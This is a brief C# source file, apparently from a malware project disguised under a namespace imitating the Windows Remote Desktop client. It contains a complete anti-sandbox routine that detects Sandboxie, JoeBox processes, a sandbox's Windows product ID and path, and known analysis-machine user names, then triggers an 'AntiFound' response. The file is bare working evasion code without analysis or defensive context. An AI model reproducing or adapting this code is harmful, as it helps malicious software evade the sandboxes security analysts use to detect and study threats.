
namespace mstsc.Aries.Antis
{
sealed class Sandbox
    {
        public Sandbox()
        {
            System.Security.Principal.WindowsPrincipal wp = new 
                System.Security.Principal.WindowsPrincipal(System.Security.Principal.WindowsIdentity.GetCurrent());
        
            CheckProcess proc = new CheckProcess();
            if ((Util.GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                         || (proc.IsProcessRunning("npfmsg"))
                        || (Microsoft.Win32.Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\", false)
                        .GetValue("ProductID").ToString() == "76487-640-1457236-23837")
                        || (System.Windows.Forms.Application.StartupPath == "C:\\analyzer\\scan") ||
                        (proc.IsProcessRunning("joeboxserver")) || (proc.IsProcessRunning("joeboxcontrol")) ||
                        (wp.Identity.Name == "HANS\\Hanuele Baser") ||
                        (wp.Identity.Name == "Sepp-PC\\Sepp") ||
                        (wp.Identity.Name == "John-PC\\John"))
            {
                new AntiFound();
            }
            //System.GC.Collect();
        }
    }
}
